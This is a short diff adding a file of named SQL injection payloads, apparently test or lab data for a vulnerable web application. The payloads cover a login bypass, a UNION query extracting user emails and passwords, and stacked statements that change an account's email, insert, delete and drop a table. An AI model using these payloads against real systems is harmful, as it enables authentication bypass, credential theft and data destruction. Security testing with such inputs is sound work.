@@ -1,0 +1,7 @@
+loginInjection = bla' or 1=1 -- 
+unionJnjection = ahgsb%' UNION SELECT id, email, password FROM users -- -%'
+updateInjection = asggs%'; update users set email = 'thanhduyuth@gmail.com' where email = 'thanhduyuth123@gmail.com' -- 
+insertInjection = ashg%'; INSERT INTO products (productName, price, quantity)
+VALUES ('Meat', 250, 150) -- 
+deleteInjection = ausygv%'; delete from products where productName = 'Potato' -- 
+dropInjection = ajsgsb%; drop table security -- 
